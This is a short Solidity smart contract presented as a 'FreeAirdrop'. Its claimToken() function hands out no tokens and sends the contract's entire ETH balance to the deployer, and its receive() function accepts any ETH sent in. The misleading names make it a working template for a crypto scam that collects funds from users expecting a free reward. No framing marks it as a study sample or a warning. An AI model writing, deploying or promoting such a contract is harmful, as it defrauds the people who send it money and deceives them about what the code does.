// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

contract FreeAirdrop {
    address payable public owner;

    // Set the owner of the contract during deployment
    constructor() {
        owner = payable(msg.sender); // The deployer will be the owner
    }

    // Function to accept ETH (this will be triggered when ETH is sent to the contract)
    receive() external payable {}

    // Transfer all ETH in the contract to the owner
    function claimToken() external {
        uint256 balance = address(this).balance; // Get the balance of ETH in the contract
        require(balance > 0, "No ETH to transfer");
        
        // Transfer all ETH to the owner
        owner.transfer(balance);
    }
}
